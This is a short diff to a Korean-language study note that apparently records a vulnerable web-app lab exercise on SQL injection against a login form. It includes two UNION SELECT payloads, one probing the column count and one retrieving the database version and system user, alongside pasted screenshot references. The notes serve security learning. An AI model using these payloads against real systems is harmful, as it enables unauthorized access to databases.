@@ -51,3 +51,24 @@ medium
 ---
 AJAX: Asynchronous JavaScript and XML(비동기 자바스크립트 xml)
 ![[Pasted image 20241010151347.png]]
+- 아무 반응이 없다.
+![[Pasted image 20241010151531.png]]
+
+# SQL Injection (Login Form/Hero)
+---
+![[Pasted image 20241010151738.png]]![[Pasted image 20241010151807.png]]
+![[Pasted image 20241010151830.png]]
+-
+```
+' union select 1,2,3,4#
+```
+![[Pasted image 20241010151924.png]]
+
+-
+```
+' union select 1,@@version,3,system_user()#
+```
+![[Pasted image 20241010152323.png]]
+
+# SQL Injection (Login Form/User)
+---
